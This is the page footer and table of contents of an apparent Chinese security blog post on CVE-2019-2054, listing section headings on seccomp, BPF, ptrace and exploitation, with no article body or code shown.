</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://github.com">Let_go</a></p><p> <span>Link:  </span><a href="http://github.com/2019/04/10/CVE-2019-2054/">http://github.com/2019/04/10/CVE-2019-2054/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2019/04/22/代码审计之CppCheck/" title="代码审计之CppCheck"><span>< PreviousPost</span><br><span class="prevTitle">代码审计之CppCheck</span></a><a class="nextSlogan" href="/2019/04/03/CVE-2018-12232-And-CVE-2019-8912/" title="CVE-2018-12232-And-CVE-2019-8912"><span>NextPost ></span><br><span class="nextTitle">CVE-2018-12232-And-CVE-2019-8912</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE-2019-2054"><span class="toc-number">1.</span> <span class="toc-text">CVE-2019-2054</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞信息"><span class="toc-number">1.1.1.</span> <span class="toc-text">漏洞信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞原理"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞原理-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞造成的影响"><span class="toc-number">1.2.2.</span> <span class="toc-text">漏洞造成的影响</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#seccomp机制"><span class="toc-number">1.3.1.</span> <span class="toc-text">seccomp机制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#使用seccomp沙箱"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">使用seccomp沙箱</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#关闭seccomp沙箱"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">关闭seccomp沙箱</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#seccomp检测工具"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">seccomp检测工具</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BPF策略"><span class="toc-number">1.3.2.</span> <span class="toc-text">BPF策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ptrace使用"><span class="toc-number">1.3.3.</span> <span class="toc-text">ptrace使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用代码"><span class="toc-number">1.3.4.</span> <span class="toc-text">利用代码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">1.4.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">1.5.</span> <span class="toc-text">参考</span></a></li></ol></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>